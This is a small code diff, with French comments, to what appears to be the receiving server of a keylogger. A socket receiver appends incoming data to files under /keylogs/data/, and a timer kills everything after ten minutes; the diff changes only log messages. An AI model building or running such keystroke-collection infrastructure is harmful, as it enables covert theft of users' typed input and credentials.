@@ -35,7 +35,7 @@ def chrono():
             seconds += 1
             time.sleep(1)
             if seconds % 10 == 0 :
-                print("ok") #si pas de reponse du client, on kill tout
+                print("Ajout de data") #si pas de reponse du client, on kill tout
             if seconds == 600 :
                 kill_all()
 
@@ -62,7 +62,7 @@ def receiver():
         with open("/keylogs/data/"+ficname, "a") as f:
             data = client_socket.recv(1024)
             f.write(data.decode('utf-8'))
-            print("Data update vers -> :" + ficname)
+            print("connexion :" + ficname)
 
     client_socket.close()
     server_socket.close()
